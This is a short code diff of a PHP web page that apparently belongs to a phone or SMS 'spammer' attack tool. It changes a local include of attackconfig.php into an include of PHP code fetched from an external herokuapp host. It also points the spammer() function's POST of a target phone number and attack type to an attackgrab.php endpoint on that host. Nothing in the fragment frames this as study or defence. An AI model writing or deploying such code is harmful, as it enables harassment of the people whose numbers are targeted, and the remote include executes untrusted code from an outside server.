@@ -4,7 +4,7 @@
 <meta charset="utf-8">
 <link rel="shortcut icon" href="server-icon.png">
 <?php
-include "attackconfig.php";
+include "https://cetuch.herokuapp.com/attackconfig.php";
 ?>
 <meta property="og:url"                content="<?php echo $CDN ?>" />
 <meta property="og:type"               content="website" />
@@ -156,7 +156,7 @@ function spammer() {
  var today = new Date();
  var now = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
  var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
-    $.post("attackgrab.php",
+    $.post("https://cetuch.herokuapp.com/attackgrab.php",
   {
     number: num,
     type: tpe
